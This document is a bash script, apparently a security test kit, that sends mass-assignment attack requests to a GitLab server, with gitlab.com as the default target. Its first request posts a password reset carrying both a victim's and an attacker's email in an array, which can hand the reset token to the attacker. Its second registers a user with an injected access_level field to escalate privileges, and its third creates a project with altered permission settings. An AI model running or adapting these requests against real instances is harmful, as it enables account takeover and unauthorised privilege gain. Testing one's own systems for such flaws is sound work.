#!/bin/bash
# GitLab Mass Assignment / Parameter Injection Tests
# Reference: CVE-2023-7028 style — Rails array parameter injection
#
# USAGE:
#   ./06-mass-assignment-password-reset.sh <gitlab-url> <victim-email> <attacker-email>

GITLAB_URL="${1:-https://gitlab.com}"
VICTIM_EMAIL="$2"
ATTACKER_EMAIL="$3"

if [ -z "$VICTIM_EMAIL" ] || [ -z "$ATTACKER_EMAIL" ]; then
    echo "Usage: $0 <gitlab-url> <victim-email> <attacker-email>"
    echo "Example: $0 https://gitlab.com victim@example.com attacker@example.com"
    echo ""
    echo "Tests for mass assignment vulnerabilities in various GitLab endpoints."
    echo "Run against YOUR OWN GitLab instance."
    exit 1
fi

echo "[*] GitLab Mass Assignment Tests"
echo "[*] Target: $GITLAB_URL"
echo ""

# Test 1: Password reset array injection
echo "--- Test 1: Password Reset Array Injection ---"
echo "[*] Sending email[] array to password reset..."
curl -s -X POST "$GITLAB_URL/users/password" \
  -d "user[email][]=$VICTIM_EMAIL&user[email][]=$ATTACKER_EMAIL" \
  -v 2>&1 | grep -E "(HTTP/|Location|error|token)"

# Test 2: User registration with extra params
echo ""
echo "--- Test 2: User Registration Extra Params ---"
curl -s -X POST "$GITLAB_URL/users" \
  -d "user[username]=test_user_$(date +%s)&user[name]=Test User&user[email]=test_$(date +%s)@example.com&user[password]=Test12345!&user[access_level]=50" \
  -v 2>&1 | grep -E "(HTTP/|Location|error)"

# Test 3: Project creation with elevated permissions
echo ""
echo "--- Test 3: Project Creation Admin Params ---"
curl -s -X POST "$GITLAB_URL/api/v4/projects" \
  -H "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  -d "name=test-project-$(date +%s)&visibility=internal&approvals_before_merge=0&request_access_enabled=false" \
  -v 2>&1 | grep -E "(HTTP/|Location|error)" || echo "[*] No token set, skipping"

echo ""
echo "[*] Done. Check responses for unexpected behavior."
echo "[*] If password reset sends to BOTH emails -> VULNERABLE to mass assignment"
